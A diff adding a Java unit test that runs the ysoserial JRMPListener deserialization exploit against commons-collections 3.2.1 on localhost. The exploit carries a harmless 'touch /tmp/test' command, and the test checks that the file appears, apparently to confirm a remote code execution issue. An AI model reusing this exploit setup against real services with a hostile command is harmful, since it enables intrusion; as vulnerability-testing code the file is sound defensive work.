@@ -1,0 +1,15 @@
+public void testIssue107() {
+    String cmd = "touch /tmp/test";
+    String[] execArgs = new String[] { "java", "-cp", "/home/your/path/commons-collections-3.2.1.jar:.", "ysoserial.exploit.JRMPListener", "127.0.0.1", "1099", cmd };
+    Executor executor = new Executor(execArgs);
+    executor.start();
+
+    try {
+        Thread.sleep(10 * 1000);
+    } catch (InterruptedException e) {
+        e.printStackTrace();
+    }
+
+    executor.stop();
+    assertTrue(new File("/tmp/test").exists());
+}
